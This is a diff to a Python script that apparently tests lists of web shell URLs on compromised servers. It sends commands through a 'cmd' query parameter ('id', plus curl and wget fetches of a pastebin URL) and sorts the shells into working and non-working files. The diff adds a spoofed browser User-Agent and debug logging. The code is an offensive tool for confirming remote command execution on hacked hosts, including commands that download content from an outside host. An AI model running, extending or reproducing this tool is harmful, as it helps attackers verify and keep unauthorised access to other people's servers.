@@ -2,6 +2,7 @@ import argparse
 import os
 import sys
 import time
+import logging
 
 import requests
 import pandas
@@ -15,13 +16,6 @@ ascii_green_color = "\x1b[32m"
 ascii_red_color = "\x1b[1;31m"
 reset_ascii_color = "\u001B[0m"
 
-cmd_id = "id"
-cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
-# this command checks could file be downloaded and redirects output to stdout without saving it
-cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
-secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
-file_with_working_shells = "working.txt"
-file_with_not_working_shells = "not_working.txt"
 
 
 def parse_arguments():
@@ -68,16 +62,33 @@ def check_status_csv_file(path, trusted_network):
 
 def send_requests_and_check_responses(shell_url):
     # TODO: think about change file logic open and saving data on exception
-    file = open("working.txt", "w")
+    cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
+    cmd_id = "id"
+    cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
+    # this command checks could file be downloaded and redirects output to stdout without saving it
+    secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
+
+    file_with_working_shells = "working.txt"
+    file_with_not_working_shells = "not_working.txt"
+    logging.basicConfig()
+    logging.getLogger().setLevel(logging.DEBUG)
+    requests_log = logging.getLogger("requests.packages.urllib3")
+    requests_log.setLevel(logging.DEBUG)
+    requests_log.propagate = True
+
+    requests.get('https://httpbin.org/headers')
     with open(file_with_working_shells, 'w') as working_shells_file:
         with open(file_with_not_working_shells, 'w') as not_working_shells_file:
             print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
 
             s = requests.Session()
             s.max_redirects = 3
-            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
+            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[404, 500, 502, 503, 504])
             s.mount('http://', HTTPAdapter(max_retries=retries))
             s.mount('https://', HTTPAdapter(max_retries=retries))
+            s.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
+                                            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.3'})
+
             try:
                 response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
                 response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
